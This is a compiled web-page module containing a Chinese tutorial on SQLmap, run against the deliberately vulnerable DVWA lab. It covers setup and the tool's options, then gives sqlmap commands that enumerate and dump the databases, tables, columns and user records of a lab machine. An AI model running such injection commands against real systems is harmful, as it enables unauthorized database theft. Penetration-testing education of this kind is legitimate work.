import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as r,c as l,d,a,b as e,f as n,e as i}from"./app-2b867918.js";const p="/assets/sqlmap-1.png",c="/assets/sqlmap-2.png",u="/assets/sqlmap-3.png",h="/assets/sqlmap-4.png",g="/assets/sqlmap-5.png",m="/assets/sqlmap-6.png",b="/assets/sqlmap-7.png",v="/assets/sqlmap-8.png",k="/assets/sqlmap-9.png",f={},_=a("div",{class:"hint-container tip"},[a("p",{class:"hint-container-title"},"前言"),a("p",null,"此系列笔记是网络渗透工具的使用方法, 本篇是介绍 SQL 注入工具 SQLmap 的使用方法。SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具, 有一个非常棒的特性, 即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。")],-1),S=i('<h2 id="sqlmap-环境" tabindex="-1"><a class="header-anchor" href="#sqlmap-环境" aria-hidden="true">#</a> SQLmap 环境</h2><div class="hint-container tip"><p class="hint-container-title">提示</p><p>由于 <code>kali Liunx</code> 已经集成了 SQLmap 的环境, 这里就直接介绍 <code>Windows</code> 下环境的构建。</p></div><h3 id="先安装-python" tabindex="-1"><a class="header-anchor" href="#先安装-python" aria-hidden="true">#</a> 先安装 Python</h3><p>正常情况下我们安装 <code>2.7.x</code> 就好了。</p>',4),q={href:"http://www.python.org/getit/",target:"_blank",rel:"noopener noreferrer"},x=a("p",null,[e("接下来只需在环境变量 "),a("code",null,"path"),e(" 中添加 Python 的安装路径就好了。"),a("br")],-1),L=a("figure",null,[a("img",{src:p,alt:"SQLmap",tabindex:"0",loading:"lazy"}),a("figcaption",null,"SQLmap")],-1),w=a("h3",{id:"再安装-sqlmap",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#再安装-sqlmap","aria-hidden":"true"},"#"),e(" 再安装 SQLmap")],-1),Q={href:"http://sqlmap.org/",target:"_blank",rel:"noopener noreferrer"},y=i('<p>将 SQLmap 解压至 Python 目录下, 将 SQLmap 的程序目录重命名为 sqlmap。</p><h4 id="在桌面新建快捷方式" tabindex="-1"><a class="header-anchor" href="#在桌面新建快捷方式" aria-hidden="true">#</a> 在桌面新建快捷方式</h4><p><code>For Example:</code></p><figure><img src="'+c+'" alt="SQLmap" tabindex="0" loading="lazy"><figcaption>SQLmap</figcaption></figure><br><figure><img src="'+u+'" alt="SQLmap" tabindex="0" loading="lazy"><figcaption>SQLmap</figcaption></figure><br><figure><img src="'+h+'" alt="SQLmap" tabindex="0" loading="lazy"><figcaption>SQLmap</figcaption></figure><h2 id="dvwa-环境" tabindex="-1"><a class="header-anchor" href="#dvwa-环境" aria-hidden="true">#</a> DVWA 环境</h2><p>DVWA(Dam Vulnerable Web Application) 使用 <code>PHP+Mysql</code> 编写的一套用于常规 WEB 漏洞教学和检测的 WEB 脆弱性测试程序。包含 SQL 注入、XSS、盲注等常见的一些漏洞。</p>',10),P={href:"http://github.com/ethicalhack3r/DVWA",target:"_blank",rel:"noopener noreferrer"},D=a("p",null,[e("在 "),a("code",null,"Windows"),e(" 下还需安装 "),a("code",null,"PHP"),e(" 环境, 这里推介两个 "),a("code",null,"PHP"),e(" 集成环境。")],-1),W={href:"http://www.upupw.net/",target:"_blank",rel:"noopener noreferrer"},E={href:"http://www.phpstudy.net/",target:"_blank",rel:"noopener noreferrer"},V=i(`<p>接下来只需修改一下配置文件就好了。</p><h2 id="sqlmap-使用方法" tabindex="-1"><a class="header-anchor" href="#sqlmap-使用方法" aria-hidden="true">#</a> SQlmap 使用方法</h2><p><code>Windows</code> 下跟 <code>kali Liunx</code> 下使用方法不相同。</p><p>为方便演示, 我们创建两个虚拟机:</p><ul><li>受害者机器, <code>Windows 2003</code> 操作系统, 运行一个 WEB 服务器, 同时跑着一个包含漏洞的 WEB 应用（DVWA）。</li><li>攻击器机器, 使用 <code>kali Liunx</code> 或者其他版本的 <code>Windows</code> 包含 SQLmap 程序。</li></ul><p>本次实验的目的: 使用 SQLmap 得到以下信息:</p><ul><li>枚举 MYSQL 用户名与密码。</li><li>枚举所有数据库。</li><li>枚举指定数据库的数据表。</li><li>枚举指定数据表中的所有用户名与密码。</li></ul><h3 id="查看帮助" tabindex="-1"><a class="header-anchor" href="#查看帮助" aria-hidden="true">#</a> 查看帮助</h3><p><code>Windows: </code> 查看 Python 帮助命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>python sqlmap.py <span class="token parameter variable">-h</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><code>kali Liunx: </code> 查看 Python 帮助命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-h</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="hint-container warning"><p class="hint-container-title">注意</p><p>需要注意的是 <code>Windows</code> 下的选项和 <code>kali Liunx</code> 下的选项是一致的, 但是命令是不一致的。在 <code>Windows</code> 下使用 <code>python sqlmap.py</code> , 而在 <code>kali Liunx</code> 下使用的是 <code>sqlmap</code> 。</p></div><h3 id="选项解释" tabindex="-1"><a class="header-anchor" href="#选项解释" aria-hidden="true">#</a> 选项解释</h3><ul><li><strong>--cookie</strong> =&gt; 设置我们的 cookie 值 &quot;将 DVWA 安全等级设置为 low&quot;</li><li><strong>--data</strong> =&gt; 设置 POST 提交的值, 如果是 GET 提交, 不需要此选项</li><li><strong>-u</strong> =&gt; 指定目标 URL</li><li><strong>-b</strong> =&gt; 获取 DBMS banner</li><li><strong>--current-db</strong> =&gt; 获取当前数据库</li><li><strong>--current-user</strong> =&gt; 获取当前数据库的用户</li><li><strong>--tables</strong> =&gt; 获取数据库里所有的表名</li><li><strong>--columns</strong> =&gt; 获取表里的所有字段</li><li><strong>--dump</strong> =&gt; 获取值</li><li><strong>--current-user</strong> =&gt; 获取当前用户</li><li><strong>-D</strong> =&gt; 爆库指定数据库名</li><li><strong>-T</strong> =&gt; 爆库指定表名</li><li><strong>-C</strong> =&gt; 爆库指定字段名</li><li><strong>--string</strong> =&gt; 当查询可用时用来匹配页面中的字符串</li><li><strong>--users</strong> =&gt; 枚举 DBMS 用户</li><li><strong>--password</strong> =&gt; 枚举 DBMS 用户密码 hash</li><li><strong>--dbs</strong> =&gt; 枚举 DBMS 中的数据库</li></ul><h2 id="开始爆库" tabindex="-1"><a class="header-anchor" href="#开始爆库" aria-hidden="true">#</a> 开始爆库</h2><p>由于 <code>Windows</code> 和 <code>kali Liunx</code> 的做法基本一致, 这里以 <code>kali Liunx</code> 为例。DVWA 的难度为 low。</p><h3 id="先获取-cookie" tabindex="-1"><a class="header-anchor" href="#先获取-cookie" aria-hidden="true">#</a> 先获取 Cookie</h3><p>每一次的 Cookie 都不一样, 这里是个示范。</p><p><code>For Example:</code> <br></p><figure><img src="`+g+`" alt="SQLmap" tabindex="0" loading="lazy"><figcaption>SQLmap</figcaption></figure><h3 id="获取数据库-current-db" tabindex="-1"><a class="header-anchor" href="#获取数据库-current-db" aria-hidden="true">#</a> 获取数据库, --current-db</h3><p><code>For Example:</code></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot;</span> --current-db
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>URL 地址和 Cookie 请用真实的替换掉。这条命令可以把当前所有的数据库获取出来的。注意 <code>--current-db</code> 的 <code>-</code> 可是有两个的。</p><figure><img src="`+m+`" alt="SQLmap" tabindex="0" loading="lazy"><figcaption>SQLmap</figcaption></figure><h3 id="获取表-tables" tabindex="-1"><a class="header-anchor" href="#获取表-tables" aria-hidden="true">#</a> 获取表, --tables</h3><p>前面, 我们已经获取到数据库名, 这时候我们要指定数据库名。使用 <code>-D</code> 选项指定数据库名。注意 <code>--tables</code> 的 <code>-</code> 可是有两个的。</p><p><code>For Example:</code></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot;</span> <span class="token parameter variable">-D</span> <span class="token string">&#39;dvwa&#39;</span> <span class="token parameter variable">--tables</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+b+`" alt="SQLmap" tabindex="0" loading="lazy"><figcaption>SQLmap</figcaption></figure><h3 id="获取字段-columns" tabindex="-1"><a class="header-anchor" href="#获取字段-columns" aria-hidden="true">#</a> 获取字段, --columns</h3><div class="hint-container tip"><p class="hint-container-title">提示</p><p>前面, 我们已经获取到数据库名和表名了, 这时候我们要指定数据库名和表名。使用 <code>-D</code> 选项指定数据库名, 使用 <code>-T</code> 指定表名。这里我们选择表 <code>users</code> 。注意 <code>--columns</code> 的 <code>-</code> 可是有两个的。</p></div><p><code>For Example:</code></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot;</span> <span class="token parameter variable">-D</span> <span class="token string">&#39;dvwa&#39;</span> <span class="token parameter variable">-T</span> <span class="token string">&#39;users&#39;</span> <span class="token parameter variable">--columns</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+v+`" alt="SQLmap" tabindex="0" loading="lazy"><figcaption>SQLmap</figcaption></figure><h3 id="获取数据-dump" tabindex="-1"><a class="header-anchor" href="#获取数据-dump" aria-hidden="true">#</a> 获取数据, --dump</h3><div class="hint-container tip"><p class="hint-container-title">提示</p><p>前面, 我们已经获取到数据库名、表名还有字段名了, 这时候我们要指定数据库名、表名还有字段名。使用 <code>-D</code> 选项指定数据库名, 使用 <code>-T</code> 指定表名, 使用 <code>-C</code> 指定字段名。这里我们选择表 <code>users</code> 中的字段 <code>user_id</code> 。注意 <code>--dump</code> 的 <code>-</code> 可是有两个的。</p></div><p><code>For Example:</code></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot;</span> <span class="token parameter variable">-D</span> <span class="token string">&#39;dvwa&#39;</span> <span class="token parameter variable">-T</span> <span class="token string">&#39;users&#39;</span> <span class="token parameter variable">-C</span> <span class="token string">&#39;user_id&#39;</span> <span class="token parameter variable">--dump</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+k+'" alt="SQLmap" tabindex="0" loading="lazy"><figcaption>SQLmap</figcaption></figure>',41);function B(H,z){const s=o("ExternalLinkIcon");return r(),l("div",null,[_,d(" more "),S,a("p",null,[a("a",q,[e("Python 官网下载地址"),n(s)])]),x,L,w,a("p",null,[a("a",Q,[e("SQLmap 官网下载地址"),n(s)])]),y,a("p",null,[a("a",P,[e("DVWA GitHub 下载地址"),n(s)])]),D,a("p",null,[a("a",W,[e("upupw PHP 集成环境"),n(s)]),e(),a("a",E,[e("phpStudy PHP 集成环境"),n(s)])]),V])}const T=t(f,[["render",B],["__file","usage-of-sqlmap.html.vue"]]);export{T as default};
